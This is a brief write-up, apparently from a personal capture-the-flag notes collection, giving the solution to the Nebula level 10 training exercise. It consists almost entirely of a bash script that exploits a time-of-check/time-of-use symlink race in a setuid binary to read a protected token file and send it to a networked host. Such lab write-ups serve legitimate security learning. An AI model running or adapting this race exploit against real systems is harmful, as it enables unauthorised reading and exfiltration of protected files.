.. _nebula10:

.. role:: bash(code)
    :language: bash
		     
Nebula level 10
===============

Basic Information
-----------------

**Home Page** https://exploit-exercises.com/nebula/level10/

Solution
--------

Put this on a file and execute it

.. code-block:: bash

   #!/bin/bash
   CONT=0.00001
   INC=0.00001

   while true; do
       cd /home/flag10
       ln -sf /home/level10/x /home/level10/y
       ./flag10 /home/level10/y 192.168.57.1 &
       sleep ${CONT}
       ln -sf /home/flag10/token /home/level10/y #| grep -v exist
       echo  "Voy en " ${CONT}
       CONT=$(awk "BEGIN {print ($CONT+$INC)}")
       sleep 2
   done
